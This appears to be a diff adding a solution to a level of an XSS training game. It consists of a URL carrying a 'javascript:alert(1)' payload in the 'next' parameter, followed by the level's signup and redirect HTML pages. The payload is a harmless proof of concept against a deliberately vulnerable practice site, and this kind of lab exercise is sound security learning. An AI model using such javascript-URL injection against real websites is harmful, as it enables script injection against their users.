@@ -1,0 +1,38 @@
+http://www.xssgame.com/f/__58a1wgqGgI/confirm?next=javascript:alert(1)
+
+
+<!DOCTYPE html>
+<html>
+  <head>
+    <link rel="stylesheet" href="/static/css/level_style.css" />
+    <script src="/static/js/js_frame.js"></script>
+  </head>
+  <body>
+    <center>
+      <img src="/static/img/googlereader-logo.png" /><br><br>
+      <!-- We're ignoring the email, but the poor user will never know! -->
+      Enter email: <input id="reader-email" name="email" value="">
+      <br><br>
+      <a href="confirm?next=welcome">Next >></a>
+    </center>
+  </body>
+</html>
+
+
+<!DOCTYPE html>
+<html>
+  <head>
+    <script src="/static/js/js_frame.js"></script>
+  </head>
+  <body style="background-color: white;">
+    <center>
+      <img src="/static/img/googlereader-logo.png" /><br><br>
+      Thanks for signing up, you will be redirected soon...
+      <script>
+        setTimeout(function() { window.location = 'welcome'; }, 1000);
+      </script>
+      
+    </center>
+  </body>
+</html>
+
